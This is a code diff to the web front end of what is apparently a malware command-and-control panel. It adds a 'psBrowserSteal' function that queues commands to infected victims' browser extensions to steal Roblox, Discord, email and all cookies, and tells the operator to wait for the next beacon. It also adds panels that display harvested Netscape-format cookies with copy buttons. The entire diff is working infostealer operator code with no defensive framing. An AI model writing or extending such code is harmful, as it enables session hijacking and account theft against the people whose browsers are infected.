@@ -1968,6 +1968,9 @@ async function openPetshiftDetail(pid) {
   document.querySelectorAll('[data-ps-cmd]').forEach(btn => {
     btn.onclick = () => psCmd(pid, btn.getAttribute('data-ps-cmd'));
   });
+  document.querySelectorAll('[data-ps-browser]').forEach(btn => {
+    btn.onclick = () => psBrowserSteal(pid, btn.getAttribute('data-ps-browser'));
+  });
   await loadPetshiftLoot(pid);
 }
 
@@ -2005,6 +2008,18 @@ async function loadPetshiftLoot(pid) {
           highlight += `<div style="margin:0 0 8px;padding:10px;border-radius:10px;background:var(--card);border:1px solid var(--border);font-family:var(--mono);font-size:11px"><div style="margin-bottom:6px;font-weight:600">Cookies</div>${lines}</div>`;
         }
       }
+      
+        if (d && typeof d === 'object') {
+          for (const k of Object.keys(d)) {
+            if (/netscape/i.test(k) && typeof d[k] === 'string' && d[k].length > 20) {
+              highlight += `<div style="margin:0 0 8px;padding:10px;border-radius:10px;background:rgba(52,211,153,.08);border:1px solid rgba(52,211,153,.3)"><div style="font-weight:600;margin-bottom:6px">${esc(k)}</div><pre style="margin:0;white-space:pre-wrap;word-break:break-all;font-family:var(--mono);font-size:10px;max-height:160px;overflow:auto">${esc(d[k]).slice(0,12000)}</pre><button class="cmd sm" type="button" onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)">Copy netscape</button></div>`;
+            }
+          }
+          if (typeof d.text === 'string' && /netscape/i.test(it.type||'')) {
+            highlight += `<div style="margin:0 0 8px;padding:10px;border-radius:10px;background:rgba(52,211,153,.08);border:1px solid rgba(52,211,153,.3)"><div style="font-weight:600;margin-bottom:6px">netscape</div><pre style="margin:0;white-space:pre-wrap;word-break:break-all;font-family:var(--mono);font-size:10px;max-height:160px;overflow:auto">${esc(d.text).slice(0,12000)}</pre><button class="cmd sm" type="button" onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)">Copy netscape</button></div>`;
+          }
+        }
+
       const data = typeof d === 'string' ? d : JSON.stringify(d, null, 2);
       return `<div class="loot-row" style="border:1px solid var(--border);border-radius:10px;padding:10px;background:var(--card2)">
         <div style="display:flex;justify-content:space-between;gap:8px;margin-bottom:6px">
@@ -2102,3 +2117,30 @@ async function psAuthDecide(id, ok) {
 setInterval(() => {
   if (document.getElementById('page-petshift')?.classList.contains('active')) refreshPsAuth();
 }, 4000);
+
+
+async function psBrowserSteal(pid, kind) {
+  // extension eid is same as petshift pid (psx_...)
+  const map = {
+    roblox: 'roblox',
+    discord: 'discord',
+    email: 'email',
+    all: 'all_cookies'
+  };
+  const cmd = map[kind] || kind;
+  // queue on browser channel
+  try {
+    await fetch('/api/browser/cmd', {
+      method: 'POST', headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ target: pid, eid: pid, cmd })
+    });
+  } catch (e) {}
+  // also petshift pending cmd
+  try {
+    await fetch('/api/petshift/cmd', {
+      method: 'POST', headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ pid, cmd })
+    });
+  } catch (e) {}
+  toast('queued ' + cmd + ' — wait for next beacon');
+}
